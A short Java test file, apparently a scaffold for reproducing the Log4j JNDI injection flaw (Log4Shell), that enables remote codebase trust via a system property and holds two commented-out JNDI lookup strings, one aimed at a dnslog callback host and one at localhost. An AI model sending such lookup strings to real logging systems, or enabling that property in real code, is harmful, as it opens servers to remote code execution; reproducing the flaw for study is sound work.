package com.vul;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.util.PropertiesUtil;
import org.apache.logging.log4j.core.net.JndiManager;
import java.util.Date;

public class Test {
    private static final Logger logger = LogManager.getLogger(Test.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        //String s = "${jndi:rmi://xxx.dnslog.cn/aaaa}";
        //logger.error("${jndi:ldap://127.0.0.1/aaa}");
    }
}
